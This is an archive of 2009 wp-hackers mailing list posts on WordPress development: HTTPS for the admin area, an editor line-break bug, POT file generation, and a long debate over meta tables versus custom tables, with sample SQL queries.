> 	if ( is_admin() && FORCE_SSL_ADMIN && substr( $value, 0, 8 ) !=  
> "https://" )
> 		$value = str_replace( "http://", "https://", $value );
> 	return $value;
> }
> add_filter( 'option_siteurl', 'slt_adminURL', 0 );
> add_filter( 'option_url', 'slt_adminURL', 0 );
>
> However, there's still a few plugins returning HTTP URLs. It all seems
> to come down to WP_CONTENT_URL being defined in wp-settings.php. It
> uses get_option('siteurl'), but I guess the settings are loaded so
> early that the above filters have no chance.
>
> Any ideas on how to do this? I thought of setting WP_CONTENT_URL in
> wp-config.php, but I guess I would have to do a "manual" check on the
> request URL to decide whether we're in admin or not, and hence whether
> to apply HTTPS or not?
>
> Or is the best approach to set up some kind of filtering of the HTML
> before output in admin, if that's possible?
>
> cheers,
>
> Steve Taylor
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mikeschinkel at newclarity.net  Sun Dec 20 23:20:17 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 20 Dec 2009 18:20:17 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
Message-ID: <94330EBB-06BA-4241-ADD9-50CCF1F2F010@newclarity.net>

On Dec 20, 2009, at 12:45 PM, Jean-Patrick Smith wrote:
> That is sad, because what PodsCMS does is provide similar functionality of a
> CRUD utility. Except it also incorporates templating into the mix, and soon
> to come, a more robust menu system than what wordpress offers out of the
> box.
> 
> 1 meta table is OK for a few blog posts... but you can't have for example a
> gaming website walk-through guide, with all extra data inside meta tables.
> After a few thousand records, you're database will start to suffer the
> consequences.
> 
> With the PodsCMS approach, it automagically creates a wp_pods_walkthrough
> table, and adds the column you specify.
> 
> While I understand Wordpress was created for blogging, the UI is so nice,
> all it needs is a little touch up to become a full blown CMS.

FWIW, I'm in almost complete agreement with you.  The only caveat would be I'd like to see meta table used for simple use-cases  and custom tables used for complex use cases; i.e. an option to use one or the other and the ability to migrate between the two.

-Mike Schinkel


From xavier at borderie.net  Mon Dec 21 12:09:45 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Mon, 21 Dec 2009 13:09:45 +0100
Subject: [wp-hackers] 2.9: editor loses line-breaks
Message-ID: <9e4ae73e0912210409l695b29abq5c6e71a06a60f9de@mail.gmail.com>

Hello,

I received a few reports from knowledgeable WP users that their
install had lost the ability to do the needed line-breaks:
http://twitter.com/stephtara/status/6863203535
http://www.wordpress-fr.net/blog/sortie-de-wordpress-2-9-carmen/comment-page-2#comment-14361
(in french)
...and I just found:
http://twitter.com/kayotickitchen/statuses/6887586570
http://twitter.com/#search?q=wordpress%20line%20breaks

Is this a known issue? Is it painlessly sovable?

Thanks.

-- 
Xavier Borderie

From bradw at illiams.com  Mon Dec 21 14:34:14 2009
From: bradw at illiams.com (Brad Williams)
Date: Mon, 21 Dec 2009 09:34:14 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
Message-ID: <003601ca824a$abb1fdc0$0315f940$@com>

I fail to see the difference between storing your data in a meta table vs. a
custom table?  After a few thousands records wouldn't your custom table
suffer the same consequences as a meta table?  Ultimately it comes down to
your server setup and what it can handle, not what table you store the data
in.


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jean-Patrick
Smith
Sent: Sunday, December 20, 2009 12:46 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Wordpress as a CMS

>
> Date: Sat, 19 Dec 2009 16:54:56 -0500
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Wordpress as a CMS
> To: wp-hackers at lists.automattic.com
> Message-ID: <FFC98AE7-7262-46D5-A60B-0042E5194F66 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> On Dec 18, 2009, at 9:44 PM, Jean-Patrick Smith wrote:
> > Wordpress as a CMS is only feasible if you do it the PodsCMS way, you
> can't
> > really scale well using the other CMS plugins that just make
> > editing/displaying meta values easier.
>
> While I actually agree with you on this I wanted to let you know that
AFAIK
> Matt disagrees.  I was fortunate to have had a long conversation about
this
> with Matt at WordCamp Birmingham and he told me him does not believe in
the
> PodsCMS/Drupal CCK approach. He said that as far as he was concerned such
an
> approach will never make it into the WordPress core, instead preferring
meta
> tables.
>
> That's my memory of the conversation anyway.  I'd love it if Matt would
> jump in to clarify his comments if I misrepresented his position on this
and
> also to give his rationale for why the PodsCMS/Drupal CCK approach is the
> wrong way to go.
>

That is sad, because what PodsCMS does is provide similar functionality of a
CRUD utility. Except it also incorporates templating into the mix, and soon
to come, a more robust menu system than what wordpress offers out of the
box.

1 meta table is OK for a few blog posts... but you can't have for example a
gaming website walk-through guide, with all extra data inside meta tables.
After a few thousand records, you're database will start to suffer the
consequences.

With the PodsCMS approach, it automagically creates a wp_pods_walkthrough
table, and adds the column you specify.

While I understand Wordpress was created for blogging, the UI is so nice,
all it needs is a little touch up to become a full blown CMS.



> Maybe it's not all bad that it remains as a plugin then, though hopefully
> an
> ever improving plugin. That way those that don't want this kind of
> functionality can quite happily avoid it, while those of us that do will
be
> able to enjoy the PodCMS benefits as we see them.
>

I'd like to see it on the level of BuddyPress, I think BP just has a well
designed website and more community support... PodsCMS makes my day though,
you can't do it with Wordpress alone, not like that.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From wordpress at dd32.id.au  Mon Dec 21 15:12:33 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 22 Dec 2009 02:12:33 +1100
Subject: [wp-hackers] 2.9: editor loses line-breaks
In-Reply-To: <9e4ae73e0912210409l695b29abq5c6e71a06a60f9de@mail.gmail.com>
References: <9e4ae73e0912210409l695b29abq5c6e71a06a60f9de@mail.gmail.com>
Message-ID: <op.u5am67hjspxmuu@dd32>

Have a look at the thread a few days ago here, See if it applies to your  
issues? (Or, rather, their issues maybe?)

"[wp-hackers] newlines from rich text editor do not convert to paragraphs"
http://lists.automattic.com/pipermail/wp-hackers/2009-December/029293.html

On Mon, 21 Dec 2009 23:09:45 +1100, Xavier Borderie <xavier at borderie.net>  
wrote:

> Hello,
>
> I received a few reports from knowledgeable WP users that their
> install had lost the ability to do the needed line-breaks:
> http://twitter.com/stephtara/status/6863203535
> http://www.wordpress-fr.net/blog/sortie-de-wordpress-2-9-carmen/comment-page-2#comment-14361
> (in french)
> ...and I just found:
> http://twitter.com/kayotickitchen/statuses/6887586570
> http://twitter.com/#search?q=wordpress%20line%20breaks
>
> Is this a known issue? Is it painlessly sovable?
>
> Thanks.
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From jayarjo at gmail.com  Mon Dec 21 15:13:50 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Mon, 21 Dec 2009 19:13:50 +0400
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
Message-ID: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com>

I'm trying to translate my theme into native language. I've followed
instructions found here:
http://codex.wordpress.org/I18n_for_WordPress_Developers at Generating
a POT file section. I've downloaded all the files from the trunk using
subversion. My server has latest gettext installation. But when I do:

php makepot.php wp-plugin your-plugin-directory (I use w-plugin switch
since I could not find a switch for themes)

I get this:

xgettext: unrecognized option `--package-name='
Try `xgettext --help' for more information.
Couldn't generate POT file!

Any solution to this?

-- 
Davit Barbakadze

From mikeschinkel at newclarity.net  Mon Dec 21 18:21:07 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 21 Dec 2009 13:21:07 -0500
Subject: [wp-hackers] Gartner Report: Social Software in the Workplace
Message-ID: <CE61278C-3BAF-4A57-8AED-96360538E9A7@newclarity.net>

I though some of you who do work with WordPress for larger customers might be interested in this Gartner report: Social Software in the Workplace:

http://acquia.com/files/marketing/Acquia_3220.pdf

-Mike Schinkel

From mikeschinkel at newclarity.net  Mon Dec 21 19:05:27 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 21 Dec 2009 14:05:27 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <003601ca824a$abb1fdc0$0315f940$@com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
Message-ID: <F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>

On Dec 21, 2009, at 9:34 AM, Brad Williams wrote:
> I fail to see the difference between storing your data in a meta table vs. a
> custom table?  After a few thousands records wouldn't your custom table
> suffer the same consequences as a meta table?  Ultimately it comes down to
> your server setup and what it can handle, not what table you store the data
> in.

Relational databases were optimized to work relationally not key-value pairs.  Index performance slows down when dealing with large numbers of records and the meta table approach typically adds an order of magnitude more records. Each meta value is another meta record you have to loop through to collect the data for a post. With a high traffic website this might be significant.

Meta records also store their "structure" with each record, i.e. the "key" in the "key-value" pair.  Relational tables store the structure only once so meta records are much more space efficient, especially if the records are using integer primary and foreign keys.

Another consideration is that certain types of join queries are much more complex or even impossible with meta tables. Let's say you want to do a query for posts that represent real estate properties and have the three meta values type, price, and city:

SELECT 
	post.ID, 
	post.ID, 
	post.post_title, 
	type.meta_value AS type, 
	price.meta_value AS price, 
	city.meta_value AS city
FROM 
  wp_posts post 
  INNER JOIN wp_postmeta city ON city.post_id = post.ID
  INNER JOIN wp_postmeta price ON price.post_id = post.ID
  INNER JOIN wp_postmeta type ON type.post_id = post.ID
WHERE 
  city.meta_key='city' AND city.meta_value='Atlanta' AND 
  type.meta_key='type' AND type.meta_value='condo' AND 
  price.meta_key='price' AND price.meta_value<250000

That's four joins with 6 criteria on string keys and a more complex query.  Now let's look at a custom table approach:

SELECT 
	post.ID, 
	post.ID, 
	post.post_title, 
	prop.type, 
	prop.price, 
	prop.city
FROM 
  wp_posts post 
  INNER JOIN wp_custom_property prop ON prop.post_id = post.ID
WHERE 
  prop.city.meta_value='Atlanta' AND 
  prop.type.meta_value='condo' AND 
  prop.price<250000

That's two joins with 3 criteria on 2 string keys and one numeric key on a simpler query.  Not only is the query much easier to read thus easier to maintain but it also will perform a lot better for a large number of records.

Now, I haven't even started to explain how ugly it gets if you need to have multiple levels of relationships, i.e. if you had a "post type" of "City" and you were instead doing the same query but this time instead of for city name you used city population greater than 5 million.

Does that maybe explain why there really is a difference between the two architectures?  

Point of note: What I'd really like to see is to have meta tables available for the simple cases and for sites that don't expect a large number of records or custom fields but the *option* built into WordPress to switch to relational tables when needed, with migration tools between the two.

-Mike Schinkel

From beau at dentedreality.com.au  Mon Dec 21 20:29:24 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Mon, 21 Dec 2009 17:29:24 -0300
Subject: [wp-hackers] Comment and Login form template functions
Message-ID: <902424490912211229t35c2f56cp2882d004a65a1bb0@mail.gmail.com>

Howdy Hackers,

Just wanted to throw these 2 tickets up in the air again to see if I
could get any input/comments on them now that 2.9 is out in the wild,
and hopefully some folks to check out "new functionality" again (not
that this really adds new stuff, just makes the current stuff easier
to work with).


Login form template function:
http://core.trac.wordpress.org/ticket/11172 -- intended to allow
themers to drop a login form anywhere with a simple function call.
Currently does *not* replace the form on wp-login.php, although the
HTML is based pretty closely on that. We could replace that form as
well I guess if people wanted to do that?

Commenting form: http://core.trac.wordpress.org/ticket/10910 -- this
is the one I'm more excited about. Hopefully provides themers with
enough hooks and filters to be able to quickly and easily add a
standardized commenting form to their comments sections without having
to manually reproduce the entire thing every time.

Cheers, and happy happy hannukawanzamas and all that :)

Beau

From otto at ottodestruct.com  Mon Dec 21 20:49:10 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 21 Dec 2009 14:49:10 -0600
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com> 
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
Message-ID: <161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>

Exactly how much metadata are you planning on storing here? Because
the performance of the index isn't related to the number of rows in
the table, it's related to the log of the number of the rows in the
table.

That is, we're indexing on the post-id, not just on the key. Unless
you're storing massive amounts of data on every single post, the
performance would not notably degrade.

Your example shows an unusual case, where you are selecting based on
metadata. However, this is an extremely unlikely case for the vast
majority of cases, where either a specific post is pulled or a series
of posts are pulled based on date, tag, category, etc. You almost
never use metadata to select which posts to display.

If you are using metadata to select posts, then obviously your example
holds, but I'd also say that you're doing it wrong and should be using
custom taxonomies instead. In your example, you use city, type, price.
Presumably every post would have one of these, in which case you
should have three taxonomies for them in order to categorize them into
the right spaces accordingly.

The current downside is that wp_query doesn't offer a way to combine
multiple custom taxonomies, but I'm sure something could be added to
make it work.

-Otto

From zamoose at gmail.com  Mon Dec 21 20:59:25 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Mon, 21 Dec 2009 15:59:25 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
Message-ID: <71ddd7490912211259u7436bed9w9557685bce5bce4c@mail.gmail.com>

On 12/21/09, Otto <otto at ottodestruct.com> wrote:

> The current downside is that wp_query doesn't offer a way to combine
> multiple custom taxonomies, but I'm sure something could be added to
> make it work.

Mark put together a brief plugin but I can't seem to track it down in
my hundreds of open tabs.

Scribu has a plugin that does something similar:
http://scribu.net/wordpress/query-multiple-taxonomies

I hereby humbly suggest that something similar goes into 3.0.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From peter.westwood at ftwr.co.uk  Mon Dec 21 22:38:23 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 21 Dec 2009 22:38:23 +0000
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
Message-ID: <4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>


On 21 Dec 2009, at 19:05, Mike Schinkel wrote:

> On Dec 21, 2009, at 9:34 AM, Brad Williams wrote:
>> I fail to see the difference between storing your data in a meta  
>> table vs. a
>> custom table?  After a few thousands records wouldn't your custom  
>> table
>> suffer the same consequences as a meta table?  Ultimately it comes  
>> down to
>> your server setup and what it can handle, not what table you store  
>> the data
>> in.
>
> Relational databases were optimized to work relationally not key- 
> value pairs.  Index performance slows down when dealing with large  
> numbers of records and the meta table approach typically adds an  
> order of magnitude more records. Each meta value is another meta  
> record you have to loop through to collect the data for a post. With  
> a high traffic website this might be significant.
>
> Meta records also store their "structure" with each record, i.e. the  
> "key" in the "key-value" pair.  Relational tables store the  
> structure only once so meta records are much more space efficient,  
> especially if the records are using integer primary and foreign keys.
>
> Another consideration is that certain types of join queries are much  
> more complex or even impossible with meta tables. Let's say you want  
> to do a query for posts that represent real estate properties and  
> have the three meta values type, price, and city:
>
> SELECT
> 	post.ID,
> 	post.ID,
> 	post.post_title,
> 	type.meta_value AS type,
> 	price.meta_value AS price,
> 	city.meta_value AS city
> FROM
>  wp_posts post
>  INNER JOIN wp_postmeta city ON city.post_id = post.ID
>  INNER JOIN wp_postmeta price ON price.post_id = post.ID
>  INNER JOIN wp_postmeta type ON type.post_id = post.ID
> WHERE
>  city.meta_key='city' AND city.meta_value='Atlanta' AND
>  type.meta_key='type' AND type.meta_value='condo' AND
>  price.meta_key='price' AND price.meta_value<250000
>
> That's four joins with 6 criteria on string keys and a more complex  
> query.  Now let's look at a custom table approach:
>
> SELECT
> 	post.ID,
> 	post.ID,
> 	post.post_title,
> 	prop.type,
> 	prop.price,
> 	prop.city
> FROM
>  wp_posts post
>  INNER JOIN wp_custom_property prop ON prop.post_id = post.ID
> WHERE
>  prop.city.meta_value='Atlanta' AND
>  prop.type.meta_value='condo' AND
>  prop.price<250000
>

In my personal opinion if I was designing a site which needed this  
kind of functionality I probably would not start with the WordPress  
platform to develop it.

I would however start with the BackPress framework because of all the  
cool WordPress like functionality it provides like User Managment, DB  
abstraction, object caching etc and I can have whatever urls I want  
and optimise the database structure to make the queries zippy.

Then when I wanted to do the content management bit of the site with  
maybe some pages and a blog I would use WordPress and integrate the  
Users/Cookies etc so it was all seamless.

That way you get the best of both worlds - the performance and  
flexibility you want for the business side of the site and the  
familiarity of the content management side.

You could even integrate the management of the content for the  
"Properties" into the WordPress backend using a plugin as well so the  
user would only need one admin panel and one set of training.

I like to use the right tools for the job rather than fight against  
the one that doesn't do what I want how I want - I find it works  
better that way

If you have any BackPress questions then please let me know off list  
and I can point you in the right direction.

Cheers

Peter


From m at mullenweg.com  Mon Dec 21 23:55:04 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 21 Dec 2009 15:55:04 -0800
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>	<003601ca824a$abb1fdc0$0315f940$@com>	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
Message-ID: <4B300AD8.8080700@mullenweg.com>

On 2009-12-21 2:38 PM, Peter Westwood wrote:
> That's four joins with 6 criteria on string keys and a more complex
> query.  Now let's look at a custom table approach:

Every large scale website I've seen dealing with this complexity of data 
does multiple queries + caching, which simplifies these scenarios 
vastly. I'm anti-join.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From viniciusandre at gmail.com  Tue Dec 22 00:17:19 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Mon, 21 Dec 2009 22:17:19 -0200
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <4B300AD8.8080700@mullenweg.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
	<4B300AD8.8080700@mullenweg.com>
Message-ID: <4ede8f490912211617r2c0ff696i9bfc412b59f6434f@mail.gmail.com>

In Mon, Dec 21, 2009 at 9:55 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> On 2009-12-21 2:38 PM, Peter Westwood wrote:
>>
>> That's four joins with 6 criteria on string keys and a more complex
>> query. ?Now let's look at a custom table approach:
>
> Every large scale website I've seen dealing with this complexity of data
> does multiple queries + caching, which simplifies these scenarios vastly.
> I'm anti-join.

I made something really nasty on WPMU for not wanting to create any
extra table only using the meta ones.

To show the latest posts and also categorize the blogs, I put a small
"LIMIT 3" query to all blogs, and in the end several "UNIONs" on a
"implode" statement to join them all and find the newest ones.

I got impressed how WP Super Cache can deal with that, and in the end
the website had more than 2.000 visits a day with no overload at all.

--
Vinicius Massuchetto
http://vinicius.soylocoporti.org.br

From mikeschinkel at newclarity.net  Tue Dec 22 01:56:52 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 21 Dec 2009 20:56:52 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
Message-ID: <DFFC683A-C938-413B-8105-68440275F948@newclarity.net>

On Dec 21, 2009, at 3:49 PM, Otto wrote:
> Exactly how much metadata are you planning on storing here?

I assume you are replying to my email although you did not reference it in specific?

> Because
> the performance of the index isn't related to the number of rows in
> the table, it's related to the log of the number of the rows in the
> table.

Agreed. The discussion was prefaced on the need for *large* datasets.

> That is, we're indexing on the post-id, not just on the key. Unless
> you're storing massive amounts of data on every single post, the
> performance would not notably degrade.

In the normal case, agreed.

Remember I said that in most cases I think post meta are the best solution, just not in all.  

> Your example shows an unusual case, where you are selecting based on
> metadata. However, this is an extremely unlikely case for the vast
> majority of cases, where either a specific post is pulled or a series
> of posts are pulled based on date, tag, category, etc. You almost
> never use metadata to select which posts to display.

I disagree that it is an unusual case.  In the nominal case where everything is viewed through the prism of "blog" I agree.  However when using WordPress as a CMS for real world applications having the need to query on more than one criteria is not at all uncommon and having multiple level relationships, which are uglier with metadata, is even more common.

> If you are using metadata to select posts, then obviously your example
> holds, but I'd also say that you're doing it wrong and should be using
> custom taxonomies instead. In your example, you use city, type, price.
> Presumably every post would have one of these, in which case you
> should have three taxonomies for them in order to categorize them into
> the right spaces accordingly.

Again, in a blog world, yes.  Not always in a CMS.  We'll have to agree to disagree there.  

The problem with taxonomies is they bring along a binary value, yes or no; i.e. is city Atlanta?  They don't bring along Atlanta's population, mayor's name, square miles, list of counties, etc. That required a more relational model. 

BTW, how are you going to get "price" represented in a taxonomy?  Or a "date?" Or other effectively attributes where potential values are effectively infinite?

> The current downside is that wp_query doesn't offer a way to combine
> multiple custom taxonomies, but I'm sure something could be added to
> make it work.

When that happens, when taxonomies can carry a value with each association and when the admin UI supports such combinations then I'll be more likely to agree that taxonomies are a panacea.

On Dec 21, 2009, at 5:38 PM, Peter Westwood wrote:
> In my personal opinion if I was designing a site which needed this kind of functionality I probably would not start with the WordPress platform to develop it.

I understand that's a position many people take.  I take the position that so much of what I need it already provided by WordPress that it's crazy not to use it.

> I would however start with the BackPress framework because of all the cool WordPress like functionality it provides like User Managment, DB abstraction, object caching etc and I can have whatever urls I want and optimise the database structure to make the queries zippy.

I googled "BackPress" and found very little substantial.  

I did find this http://www.ohloh.net/p/backpress but this "Decreasing year-over-year development activity" would scare me away from it.  I'd be far more apt to use CakePHP or similar if I had to abandon WordPress as a CMS framework.

> I like to use the right tools for the job rather than fight against the one that doesn't do what I want how I want - I find it works better that way

The "right tool for the job" is an illusive holy grail. Every tool has tradeoffs; the tradeoffs that I value are different than the ones you value.  I value that simplicity of WordPress architecture and the vast support it has from 3rd party themes and plugins, 1000s of articles on how to use it, and how nicely it does 90% of what I need (it's that 10% I'm trying to get past.  But a year ago is was only 85% of what I need so it's getting better.)

> If you have any BackPress questions then please let me know off list and I can point you in the right direction.

Thanks for the offer.  I'd be interested if it were something a lot of people were using and actively writing about.  If I am somehow misunderstanding its role then I would be very interested in learning more about it.

On Dec 21, 2009, at 6:55 PM, Matt Mullenweg wrote:
> Every large scale website I've seen dealing with this complexity of data does multiple queries + caching, which simplifies these scenarios vastly. I'm anti-join.

FWIW I'm anti-caching in the nominal case; i.e. caching should be for optimizing performance when good performance can't be otherwise had but not as an upfront architecture choice.


On Dec 21, 2009, at 7:17 PM, Vinicius Massuchetto wrote:
> I got impressed how WP Super Cache can deal with that, and in the end
> the website had more than 2.000 visits a day with no overload at all.

2000 visits a day is one visit ever 43.2 seconds.  I *hope* WordPress meta can handle that.

How about 2000 visits a minute?  That's much harder.

ANYWAY, I'm not trying to perpetuate this debate. It is what it is, I was just explaining to the person who advocated why custom tables were not going to happen (Matt and others are against it) and then explain my view of the benefits of custom tables to someone asked why it mattered.

I'm continuing to work on PostTypeVoodoo as a I have time. It will be a tool to provide a UI for adding post types and for routing URLs.  It may also support added custom table definitions but will, for simplicity, only support custom fields.  Once it's gotten a minimum feature set I'll release.

-Mike

From ravi-lists at g8o.net  Tue Dec 22 04:03:25 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Mon, 21 Dec 2009 23:03:25 -0500
Subject: [wp-hackers] Keeping track of comment responses
In-Reply-To: <05F481B8-2A01-46EE-8B46-1B358EADF3F5@g8o.net>
References: <05F481B8-2A01-46EE-8B46-1B358EADF3F5@g8o.net>
Message-ID: <E35DB7D1-584A-4F92-8A8A-27648318878A@g8o.net>

On Dec 3, 2009, at 1:21 PM, I wrote:
> 
> I need your advice before I run off trying to implement something.
> 
> My problem: how do I keep track of which comments I have responded to and which ones are awaiting a response?
> 
> I can think of a few ways (and perhaps I am missing some simpler, obvious ones?):
> 
> Just view the comments, threaded, in the relevant post page, and if any thread doesn't have a comment from me (easily ascertained by looking for my Gravatar), then I know a response is pending. Next step: add a response. The problem: once I post my response, the page reloads, I lose my position in the comment stream, and have to scroll down again to find it. I had a hope that one of the AJAX comment posting plugins might help me, but unfortunately none did.
> 
> Another option is to use the Dashboard comment interface to add my replies. This is AJAXified already in WP, so the operation is quick and I don't lose my position. But the Dashboard comment interface is not threaded (or sortable in some way that might be equivalent) and a return to it on a later date leaves me as puzzled as before on whether a comment has been responded to.
> 
> Assuming that I am not missing an obvious solution, or that one isn't available elsewhere, what I would like to do is:
> 
> Hack the Dashboard comments interface to add a small indicator next to each comment to denote whether it has a response from me or not. There are many considerations that I will ignore in my first cut (e.g: who is "me"? the author of the post? and what about comments that do not need a response?) just to get me to a point where I can improve my day to day usage. But I would like to do it the right way, nonetheless, so any pointers to hooks or other mechanisms would be greatly appreciated.
> 

It seems that the best way of going about the above is to use the 'comment_row_actions' filter. Am I on the right path?

Thank you,

	--ravi


From r at schi.lt  Tue Dec 22 10:21:31 2009
From: r at schi.lt (Robert Schilt (schi.lt))
Date: Tue, 22 Dec 2009 10:21:31 +0000
Subject: [wp-hackers] XMAS greetings and a Thank You
Message-ID: <1261477291.5836.76.camel@robert-laptop>

This might not be the appropriate medium to say what I'm about to say
nevertheless I'm going to proceed to type regardless.

I've been blogging for the past 5 years - the last two on the WP
platform. Something about WP that just "pulls" a man in - certainly this
here bloke. The deeper I dig and play the more I realise and learn about
the depth, flexibility, and the robustness of WP as a means to develop
and deliver an experience to both author and visitor. The deeper I delve
into the mechanics and structure of WP the more I realise that I am only
scratching the surface.

But above all else I have grown to admire and deeply appreciate the
contribution and efforts by core and plugin developers alike. As with
all Open Source endeavours - the product is only as strong and dynamic
as the community which surround it. Wordpress has an incredibly loyal,
vibrant and growing user/developer base. And over the past two months -
since joining this list - I can now vouch for intelligence, depth and
insight of those that "participate" and "give".

To those that "give"... I would like to take this opportunity to thank
you and wish you all the very best to you and families over the festive
season. May all your xmas's come at once and may 2010 be a ripper for
mighty and the meek. Joy, peace and safety to all.

Robert
(all the way from Papua New Guinea)
http://www.trupela.com/

   


From wordpress at santosj.name  Tue Dec 22 11:23:42 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 22 Dec 2009 05:23:42 -0600
Subject: [wp-hackers] Metadata Mess
Message-ID: <4B30AC3E.8030803@santosj.name>

I'm not sure what the argument was, but it seems to me that this table 
structure:

id,
object_type
object_id
key_name
key_value

Could easily replace the 3 tables that currently exist. Of course, it 
might seem slow that object_type would be varchar and usually a number 
index will be faster, but at this point, I'll rather go with anything.

Wasn't there a ticket at some point about replacing the tables? Pretty 
sure there was, was there no traction? Was the patch(es) not acceptable? 
Did no one create a patch? Was the API unacceptable? What would make an 
API acceptable?

I think starting simple and then going crazy with the scheme should work 
better, because I don't want to have to defend or explain why there are 
three tables that are same except for where they are joined. Actually, 
my boss would enjoy the wasteful use of duplicate table structures.

Excuse me while I go blow my brains out while screaming obscenities.

Jacob Santos

From malaiac at gmail.com  Tue Dec 22 11:37:13 2009
From: malaiac at gmail.com (Malaiac)
Date: Tue, 22 Dec 2009 12:37:13 +0100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <4ede8f490912211617r2c0ff696i9bfc412b59f6434f@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
	<4B300AD8.8080700@mullenweg.com>
	<4ede8f490912211617r2c0ff696i9bfc412b59f6434f@mail.gmail.com>
Message-ID: <59e7f3130912220337u105f9035rf62a18150f7c20bf@mail.gmail.com>

2009/12/22 Vinicius Massuchetto <viniciusandre at gmail.com>:
> I got impressed how WP Super Cache can deal with that, and in the end
> the website had more than 2.000 visits a day with no overload at all.
>

there is no scalability issues to speak of before 10k visits a day.
I  work on two WP installs which often get more than 200k pages views
per day. One of them is a very custom game website (10 pages, one of
them get more than 50k views a day), the other a buzz/zeitgeist
website with many embed videos, ads, etc.

M

From malaiac at gmail.com  Tue Dec 22 11:38:29 2009
From: malaiac at gmail.com (Malaiac)
Date: Tue, 22 Dec 2009 12:38:29 +0100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <59e7f3130912220337u105f9035rf62a18150f7c20bf@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
